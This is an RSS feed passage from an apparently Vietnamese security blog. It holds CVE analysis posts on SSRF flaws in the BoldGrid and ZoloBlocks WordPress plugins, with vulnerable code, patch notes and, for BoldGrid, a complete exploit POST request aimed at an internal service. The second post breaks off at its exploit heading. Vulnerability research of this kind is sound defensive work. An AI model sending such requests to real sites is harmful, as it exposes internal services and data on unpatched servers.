2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;G·ª≠i POST request v·ªõi URL tr·ªè ƒë·∫øn local service:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: wordpress_86a9106ae65537651a8e456835b316ab=con%7C1761816248%7CDDS70mMGANEkpR68MrIikvC8WRqNkBMl8KlbXrbSh8Q%7C07a62e731a6142aa7b15555fdd5e1cbdd114cffb4a041ba0ecd9394c8319bb3f; wp-settings-time-2=1761643645; _lscache_vary=0f9122a3a07756eeee3b4199f2c151b1; wp-settings-4=libraryContent%3Dbrowse%26uploader%3D1%26mfold%3Do; wp-settings-time-4=1761637043; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1761816248%7CDDS70mMGANEkpR68MrIikvC8WRqNkBMl8KlbXrbSh8Q%7C450b8e4bb8ebb335d435b94645ae098cee383a09a6e129efbdec8a2348deeda0&#xA;...&#xA;&#xA;action=boldgrid_redirect_url&amp;amp;urls[0]=http://localhost:8001/metadata&amp;amp;boldgrid_gridblock_image_ajax_nonce=482dbb1ed2&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-01-cve-2025-52713/result.png&#34; title=&#34;N·ªôi dung ƒë·ªçc ƒë∆∞·ª£c t·ª´ local service&#34; data-thumbnail=&#34;/posts/2025-11-01-cve-2025-52713/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;N·ªôi dung ƒë·ªçc ƒë∆∞·ª£c t·ª´ local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-01-cve-2025-52713/result.png&#39; alt=&#34;Result&#34; height=&#34;641&#34; width=&#34;1542&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;N·ªôi dung ƒë·ªçc ƒë∆∞·ª£c t·ª´ local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;CVE-2025-52713&lt;/strong&gt; xu·∫•t ph√°t t·ª´ vi·ªác h√†m &lt;code&gt;get_redirect_url()&lt;/code&gt; trong plugin &lt;strong&gt;BoldGrid Post and Page Builder&lt;/strong&gt; (‚â§ 1.27.8) g·ª≠i y√™u c·∫ßu HTTP ƒë·∫øn URL do ng∆∞·ªùi d√πng cung c·∫•p m√† kh√¥ng ki·ªÉm tra ho·∫∑c gi·ªõi h·∫°n, d·∫´n ƒë·∫øn &lt;strong&gt;SSRF&lt;/strong&gt;.&#xA;K·∫ª t·∫•n c√¥ng c√≥ quy·ªÅn &lt;strong&gt;Contributor&lt;/strong&gt; c√πng nonce h·ª£p l·ªá c√≥ th·ªÉ bu·ªôc m√°y ch·ªß g·ª≠i request ƒë·∫øn c√°c ƒë·ªãa ch·ªâ n·ªôi b·ªô.&#xA;B·∫£n v√° (1.27.9) kh·∫Øc ph·ª•c b·∫±ng c√°ch d√πng &lt;code&gt;esc_url_raw()&lt;/code&gt; v√† &lt;code&gt;wp_safe_remote_head()&lt;/code&gt; v·ªõi gi·ªõi h·∫°n &lt;code&gt;timeout&lt;/code&gt; v√† &lt;code&gt;redirection&lt;/code&gt;, ngƒÉn ch·∫∑n y√™u c·∫ßu nguy hi·ªÉm.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nguy√™n nh√¢n: thi·∫øu x√°c th·ª±c v√† l·ªçc ƒë·∫ßu v√†o URL.&lt;/li&gt;&#xA;&lt;li&gt;Nonce ch·ªâ ch·ªëng CSRF, kh√¥ng ngƒÉn SSRF.&lt;/li&gt;&#xA;&lt;li&gt;M·ª©c ƒë·ªô ·∫£nh h∆∞·ªüng: &lt;strong&gt;Low (6.4)&lt;/strong&gt; nh∆∞ng c√≥ th·ªÉ d·∫´n ƒë·∫øn r√≤ r·ªâ d·ªØ li·ªáu n·ªôi b·ªô.&lt;/li&gt;&#xA;&lt;li&gt;C·∫≠p nh·∫≠t l√™n &lt;strong&gt;v1.27.9&lt;/strong&gt; ƒë·ªÉ v√° l·ªói.&lt;/li&gt;&#xA;&lt;li&gt;Khi ph√°t tri·ªÉn, n√™n lu√¥n d√πng API an to√†n (&lt;code&gt;wp_safe_remote_*&lt;/code&gt;) v√† l·ªçc URL b·∫±ng &lt;code&gt;esc_url_raw()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) ‚Äî Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/post-and-page-builder/vulnerability/wordpress-post-and-page-builder-by-boldgrid-visual-drag-and-drop-editor-plugin-1-27-8-server-side-request-forgery-ssrf-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Post and Page Builder by BoldGrid ‚Äì Visual Drag and Drop Editor Plugin &amp;lt;= 1.27.8 is vulnerable to Server Side Request Forgery (SSRF) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-60161 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-31-cve-2025-60161/</link>
      <pubDate>Fri, 31 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-31-cve-2025-60161/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-31-cve-2025-60161/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng Server-Side Request Forgery (SSRF) trong BdThemes ZoloBlocks cho ph√©p k·∫ª t·∫•n c√¥ng th·ª±c hi·ªán y√™u c·∫ßu gi·∫£ m·∫°o t·ª´ ph√≠a m√°y ch·ªß. S·ª± c·ªë n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c phi√™n b·∫£n ZoloBlocks t·ª´ kh√¥ng x√°c ƒë·ªãnh cho ƒë·∫øn 2.3.11.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-60161&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-60161&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.3.11&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.3.12&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/zoloblocks/advanced/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress ZoloBlocks Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;ZoloBlocks&lt;/strong&gt;: &lt;strong&gt;2.3.11&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;2.3.12&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;L·ªó h·ªïng n√†y xu·∫•t hi·ªán trong t·ªáp &lt;code&gt;TemplatesV1.php&lt;/code&gt;, tuy nhi√™n t·ªáp n√†y ƒë√£ b·ªã lo·∫°i b·ªè trong phi√™n b·∫£n v√° l·ªói.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-31-cve-2025-60161/removed.png&#34; title=&#34;TemplatesV1.php ƒë√£ b·ªã lo·∫°i b·ªè trong b·∫£n v√°&#34; data-thumbnail=&#34;/posts/2025-10-31-cve-2025-60161/removed.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;TemplatesV1.php ƒë√£ b·ªã lo·∫°i b·ªè trong b·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-31-cve-2025-60161/removed.png&#39; alt=&#34;Diff&#34; height=&#34;466&#34; width=&#34;1550&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;TemplatesV1.php ƒë√£ b·ªã lo·∫°i b·ªè trong b·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function demo_import() {&#xA;    // Ki·ªÉm tra tham s·ªë ƒë·∫ßu v√†o t·ª´ POST&#xA;    if (!isset($_POST[&amp;#39;json_file_url&amp;#39;])) {&#xA;        wp_send_json_error(&amp;#39;No JSON file URL provided&amp;#39;);&#xA;        return;&#xA;    }&#xA;&#xA;    // L·∫•y v√† l√†m s·∫°ch URL ng∆∞·ªùi d√πng cung c·∫•p&#xA;    $json_file_url = sanitize_text_field(wp_unslash($_POST[&amp;#39;json_file_url&amp;#39;]));&#xA;&#xA;    // G·ª≠i y√™u c·∫ßu HTTP ƒë·∫øn URL ƒë√≥&#xA;    $response = wp_remote_get($json_file_url, [&amp;#39;timeout&amp;#39; =&amp;gt; 30]);&#xA;&#xA;    // N·∫øu l·ªói khi fetch d·ªØ li·ªáu, tr·∫£ JSON l·ªói&#xA;    if (is_wp_error($response)) {&#xA;        wp_send_json_error(&amp;#39;Failed to fetch JSON data&amp;#39;);&#xA;        return;&#xA;    }&#xA;&#xA;    // L·∫•y n·ªôi dung ph·∫£n h·ªìi v√† gi·∫£i m√£ JSON&#xA;    $body    = wp_remote_retrieve_body($response);&#xA;    $data    = json_decode($body, true);&#xA;    $content = $data[&amp;#39;content&amp;#39;] ?? &amp;#39;&amp;#39;;&#xA;&#xA;    // Tr·∫£ k·∫øt qu·∫£ JSON th√†nh c√¥ng c√πng n·ªôi dung import&#xA;    wp_send_json_success([&#xA;        &amp;#39;status&amp;#39;   =&amp;gt; &amp;#39;success&amp;#39;,&#xA;        &amp;#39;message&amp;#39;  =&amp;gt; __(&amp;#39;Pattern imported successfully!&amp;#39;, &amp;#39;zoloblocks&amp;#39;),&#xA;        &amp;#39;content&amp;#39;  =&amp;gt; $content,&#xA;    ]);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;details admonition bug open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;L·ªói&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;H√†m &lt;code&gt;demo_import()&lt;/code&gt; nh·∫≠n URL t·ª´ ng∆∞·ªùi d√πng =&amp;gt; g·ª≠i y√™u c·∫ßu HTTP (&lt;code&gt;wp_remote_get&lt;/code&gt;) ƒë·ªÉ t·∫£i d·ªØ li·ªáu JSON ‚Üí gi·∫£i m√£ v√† tr·∫£ v·ªÅ k·∫øt qu·∫£ qua &lt;code&gt;wp_send_json_success()&lt;/code&gt;.&#xA;V√¨ kh√¥ng ki·ªÉm tra ho·∫∑c gi·ªõi h·∫°n URL, n√™n c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng g√¢y &lt;strong&gt;SSRF&lt;/strong&gt;.&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;p&gt;H√†m &lt;code&gt;demo_import()&lt;/code&gt; ƒë∆∞·ª£c ƒëƒÉng k√≠ l√†m callback cho action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp_ajax_nopriv_zolo_demo_import&amp;#39;, [$this, &amp;#39;demo_import&amp;#39;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêi·ªÅu n√†y c√≥ nghƒ©a l√†:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Hook &lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; ƒë∆∞·ª£c s·ª≠ d·ª•ng cho &lt;strong&gt;ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng nh·∫≠p&lt;/strong&gt; (anonymous users).&lt;/li&gt;&#xA;&lt;li&gt;Khi client g·ª≠i request AJAX ƒë·∫øn endpoint &lt;code&gt;/wp-admin/admin-ajax.php?action=zolo_demo_import&lt;/code&gt;, WordPress s·∫Ω g·ªçi h√†m &lt;code&gt;demo_import()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;admin-ajax.php?action=zolo_demo_import&amp;#34;] --&amp;gt; B[&amp;#34;wp_ajax_nopriv_zolo_demo_import&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;demo_import()&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;sanitize_text_field()&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;wp_remote_get(json_file_url)&amp;#34;]&#xA;E --&amp;gt; F{&amp;#34;is_wp_error(response)?&amp;#34;}&#xA;F -- Yes --&amp;gt; G[&amp;#34;wp_send_json_error()&amp;#34;]&#xA;F -- No --&amp;gt; H[&amp;#34;json_decode(body) ‚Üí extract URLs&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;wp_send_json_success()&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 